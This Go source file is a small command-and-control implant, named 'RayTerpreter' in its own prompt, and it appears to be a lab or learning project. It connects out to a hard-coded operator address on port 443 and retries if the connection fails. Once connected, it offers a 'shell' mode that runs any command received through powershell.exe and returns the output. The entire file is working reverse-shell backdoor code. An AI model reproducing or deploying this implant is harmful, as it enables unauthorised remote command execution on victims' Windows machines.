package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
	if *attempts > 3 {
		terminate()
	}
	addr, err := net.Dial("tcp", *c2Address)
	if err != nil {
		fmt.Println("Couldn't establish a connection")
		*attempts = *attempts + 1
		time.Sleep(10 * time.Second)
		return addr, false
	}
	addr.Write([]byte("Success\n"))
	return addr, true
}

func listen4Commands(conn net.Conn, implantWD *string) string {
	request := make([]byte, 128)
	read_len, err := conn.Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	return command
}

func executeCommands(conn net.Conn, command string) {
	if command == "stop\n" {
		terminate()
	}
	cmd := exec.Command("powershell.exe", "/C", command)
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Couldn't Exec Command")
	}
	if len(output) < 1 {
		output = []byte("Couldn't execute the command\n")
	}
	conn.Write(output)
	//conn.Write([]byte("PS > "))
}

func terminate() {
	fmt.Println("Terminating Implant")
	time.Sleep(1 * time.Second)
	os.Exit(0)
}

func main() {
	c2Address := "192.168.0.106:443"
	attempts := 0
	implantWD, _ := os.Getwd()
	fmt.Println("Implant Started")
	conn, result := callHome(&c2Address, &attempts)
	for !result {
		conn, result = callHome(&c2Address, &attempts)
	}
	for {
		conn.Write([]byte("RayTerpreter $ "))
		command := listen4Commands(conn, &implantWD)
		switch command {
		case "shell\n":
			{
				for {
					conn.Write([]byte("PS > "))
					command = listen4Commands(conn, &implantWD)
					if command == "bg\n" {
						break
					}
					executeCommands(conn, command)
				}
			}
		case "stop\n":
			terminate()
		default:
			conn.Write([]byte("Available Commands: shell, stop\n"))
		}
	}
	//time.Sleep(10 * time.Second)
}
